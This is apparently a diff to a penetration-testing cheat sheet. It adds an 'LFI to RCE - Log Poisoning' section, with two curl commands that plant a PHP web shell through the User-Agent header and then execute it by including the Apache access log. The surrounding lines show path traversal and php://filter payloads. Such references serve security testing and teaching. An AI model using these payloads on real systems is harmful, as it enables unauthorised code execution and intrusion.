@@ -956,6 +956,13 @@ http://<domain name>/<page>?page=../../../../../../../../windows/system32/driver
 http://<domain name>/blog.php?article=php://filter/convert.base64-encode/resource=db.php
 ```
 
+- Local File Inclusion (LFI) to Remote Code Execution (RCE) - Log Poisoning
+
+```
+$ curl -s "http://<IP address>/" -A "<?php system(\$_GET['c']); ?>"
+$ curl -s "http://<IP address>/lang.php?page=C:/xampp/apache/logs/access.log&c=whoami"
+```
+
 - Remote File Inclusion (RFI)
 
 ```
